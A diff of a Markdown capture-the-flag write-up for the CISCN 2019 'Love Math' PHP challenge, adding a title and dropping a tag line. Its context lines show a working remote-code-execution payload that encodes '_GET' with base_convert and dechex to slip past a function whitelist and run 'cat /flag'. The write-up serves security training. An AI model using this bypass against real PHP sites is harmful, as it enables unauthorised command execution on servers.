@@ -1,3 +1,4 @@
+# [CISCN 2019 初赛]Love Math
 ![](<./img/Pasted image 20221202195606.png>)
 
 ---
@@ -82,5 +83,3 @@ abs=system&cos=<command>
 /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos})&abs=system&cos=cat /flag
 ```
 ![](<./img/Pasted image 20221202220340.png>)
-
-#Web #PHP #RCE #function #数学 #可变变量 #bypass
